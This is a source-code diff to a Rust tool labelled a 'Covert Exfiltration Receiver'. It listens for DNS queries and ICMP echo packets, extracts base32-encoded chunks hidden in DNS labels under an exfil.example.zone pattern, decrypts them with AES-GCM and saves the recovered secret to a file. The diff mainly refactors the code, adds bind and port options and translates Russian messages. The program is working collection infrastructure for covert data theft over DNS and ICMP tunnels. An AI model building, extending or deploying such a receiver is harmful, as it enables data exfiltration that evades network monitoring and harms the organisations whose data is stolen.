@@ -1,5 +1,6 @@
 use anyhow::{Context, Result};
 use async_trait::async_trait;
+use clap::Parser;
 use covert_core::{
     decrypt_aes_gcm,
     encoding::from_base32,
@@ -12,10 +13,19 @@ use pnet::packet::ethernet::{EtherTypes, EthernetPacket};
 use pnet::packet::icmp::{IcmpPacket, IcmpTypes};
 use pnet::packet::ipv4::Ipv4Packet;
 use pnet::packet::Packet;
-use std::net::SocketAddr;
 use std::sync::{Arc, Mutex};
 use tokio::net::UdpSocket;
 use tokio::task;
+
+#[derive(Parser)]
+#[command(name = "covert-receiver")]
+struct Args {
+    #[arg(long, default_value = "5371")]
+    port: u16,
+
+    #[arg(long, default_value = "0.0.0.0")]
+    bind: String,
+}
 
 #[derive(Clone)]
 struct ExfilHandler {
@@ -31,6 +41,7 @@ impl ExfilHandler {
 
     fn try_reassemble(&self) {
         let mut guard = self.chunks.lock().unwrap();
+
         if guard.len() < 2 {
             println!("Not enough chunks yet: {}", guard.len());
             return;
@@ -62,6 +73,7 @@ impl ExfilHandler {
             Ok(plaintext) => {
                 println!("DECRYPTION SUCCESS! plaintext = {} bytes", plaintext.len());
                 println!("First 64 bytes (hex):");
+
                 for chunk in plaintext.chunks(16) {
                     print!("  ");
                     for b in chunk {
@@ -97,7 +109,6 @@ impl ExfilHandler {
                     println!("Saved raw plaintext to recovered_secret.txt");
                 }
 
-                // Очищаем после попытки
                 guard.clear();
             }
             Err(e) => {
@@ -115,26 +126,43 @@ impl RequestHandler for ExfilHandler {
         mut response_handle: R,
     ) -> ResponseInfo {
         let src = request.src();
-        let qname = request.queries().first().map(|q| q.name().to_string()).unwrap_or_default();
+        let qname = request
+            .queries()
+            .first()
+            .map(|q| q.name().to_string())
+            .unwrap_or_default();
 
         println!("[DNS] Query from {}: {}", src, qname);
 
         if let Some(query) = request.queries().first() {
-            let labels: Vec<String> = query.name().iter().map(|l| String::from_utf8_lossy(l).to_string()).collect();
+            let labels: Vec<String> = query
+                .name()
+                .iter()
+                .map(|l| String::from_utf8_lossy(l).to_string())
+                .collect();
 
             if labels.len() >= 4 {
                 let chunk_str = &labels[0];
-                let exfil   = labels[1].to_lowercase();
+                let exfil = labels[1].to_lowercase();
                 let example = labels[2].to_lowercase();
-                let zone    = labels[3].to_lowercase();
+                let zone = labels[3].to_lowercase();
 
-                if zone.contains("zone") && example.contains("example") && exfil.contains("exfil") {
-                    println!("\n=== Decoding chunk ({} characters) ===", chunk_str.len());
+                if zone.contains("zone")
+                    && example.contains("example")
+                    && exfil.contains("exfil")
+                {
+                    println!(
+                        "\n=== Decoding chunk ({} characters) ===",
+                        chunk_str.len()
+                    );
 
                     match from_base32(chunk_str) {
                         Ok(decoded) => {
                             println!("Success: {} bytes", decoded.len());
-                            println!("First 16 bytes: {:02x?}", &decoded[..16.min(decoded.len())]);
+                            println!(
+                                "First 16 bytes: {:02x?}",
+                                &decoded[..16.min(decoded.len())]
+                            );
 
                             let mut chunks = self.chunks.lock().unwrap();
                             chunks.push(decoded);
@@ -145,7 +173,7 @@ impl RequestHandler for ExfilHandler {
                         Err(e) => println!("Decode error: {}", e),
                     }
                 } else {
-                    println!("Домен не совпадает");
+                    println!("Domain does not match expected pattern");
                 }
             }
         }
@@ -181,17 +209,26 @@ impl RequestHandler for ExfilHandler {
 
 #[tokio::main]
 async fn main() -> Result<()> {
+    let args = Args::parse();
+
     println!("=== Covert Exfiltration Receiver ===");
+
+    let bind_addr = format!("{}:{}", args.bind, args.port);
+    println!("Starting DNS listener on {}", bind_addr);
 
     let handler = ExfilHandler::new();
 
-    let tokio_sock = UdpSocket::bind("0.0.0.0:5371").await.context("bind failed")?;
-    let std_sock = tokio_sock.into_std().context("into_std failed")?;
+    let tokio_sock = UdpSocket::bind(&bind_addr)
+        .await
+        .context("bind failed")?;
+    let std_sock = tokio_sock
+        .into_std()
+        .context("into_std failed")?;
 
     let mut server = ServerFuture::new(handler.clone());
     server.register_socket_std(std_sock)?;
 
-    println!("DNS listening on 0.0.0.0:5371");
+    println!("DNS listening on {}", bind_addr);
 
     tokio::spawn(async move {
         let _ = server.block_until_done().await;
@@ -217,12 +254,18 @@ async fn main() -> Result<()> {
                 if let Some(eth) = EthernetPacket::new(frame) {
                     if eth.get_ethertype() == EtherTypes::Ipv4 {
                         if let Some(ip) = Ipv4Packet::new(eth.payload()) {
-                            if ip.get_next_level_protocol() == pnet::packet::ip::IpNextHeaderProtocols::Icmp {
+                            if ip.get_next_level_protocol()
+                                == pnet::packet::ip::IpNextHeaderProtocols::Icmp
+                            {
                                 if let Some(icmp) = IcmpPacket::new(ip.payload()) {
                                     if icmp.get_icmp_type() == IcmpTypes::EchoRequest {
                                         let payload = icmp.payload();
                                         if !payload.is_empty() {
-                                            println!("[ICMP] from {} | len: {}", ip.get_source(), payload.len());
+                                            println!(
+                                                "[ICMP] from {} | len: {}",
+                                                ip.get_source(),
+                                                payload.len()
+                                            );
                                         }
                                     }
                                 }
